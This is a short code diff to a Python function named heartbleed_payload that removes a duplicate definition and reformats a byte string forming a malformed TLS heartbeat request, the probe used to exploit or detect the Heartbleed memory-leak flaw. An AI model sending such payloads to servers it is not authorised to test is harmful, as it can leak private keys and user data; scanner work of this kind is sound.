@@ -99,13 +99,8 @@ def heartbleed_payload(sslVersion):
         TLSV1_1: '\x02',
         TLSV1_2: '\x03'}
 
-    payload = ('\x18'           # Record type - Heartbeat
-        '\x03{0}'               # TLS version
-        '\x00\x03'              # Record length
-        '\x01'                  # Heartbeat type - Request
-        '\x00\x00')             # Heartbeat length
-
-    payload = ('\x18'           # Record type - Heartbeat
+    payload = (
+        '\x18'           # Record type - Heartbeat
         '\x03{0}'               # TLS version
         '\x40\x00'              # Record length
         '\x01'                  # Heartbeat type - Request
